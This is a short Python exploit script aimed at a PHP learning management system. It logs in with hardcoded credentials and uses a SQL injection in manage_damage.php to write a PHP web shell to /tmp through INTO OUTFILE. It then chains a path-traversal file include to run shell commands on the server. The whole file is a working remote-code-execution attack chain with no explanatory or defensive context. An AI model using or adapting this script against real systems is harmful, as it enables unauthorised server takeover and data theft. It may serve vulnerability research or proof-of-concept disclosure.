import requests

BASE_URL = 'http://192.168.1.167/php-lms'

CREDENTIALS = {
    'username': 'mwilliams',
    'password': 'mwilliams123'
}
sess = requests.Session()

payload = """0' UNION SELECT 1,1,'<?php echo system($_GET["cmd"]); ?>',1,1,1,1,1,1 FROM users INTO OUTFILE '/tmp/shell.php' --%20"""
params = {
    'f': 'login',
}
sess.get(BASE_URL + '/admin/')
resp = sess.post(BASE_URL + '/classes/Login.php', data=CREDENTIALS, params=params, verify=False)
if not ('status' in resp.json() and resp.json()['status'] == 'success'):
    raise Exception('User not found (Can\'t login)')

resp = sess.get(BASE_URL + '/admin/damage/manage_damage.php', params={'id':payload})

if resp.status_code != 200:
    print(resp.text)
    print(resp.status_code)
    raise Exception('Unable to save shell')


resp = sess.get(BASE_URL + '/admin/?page=../../../../../../../../../../../../../tmp/shell', params={'cmd':'dir'})
print(resp.text)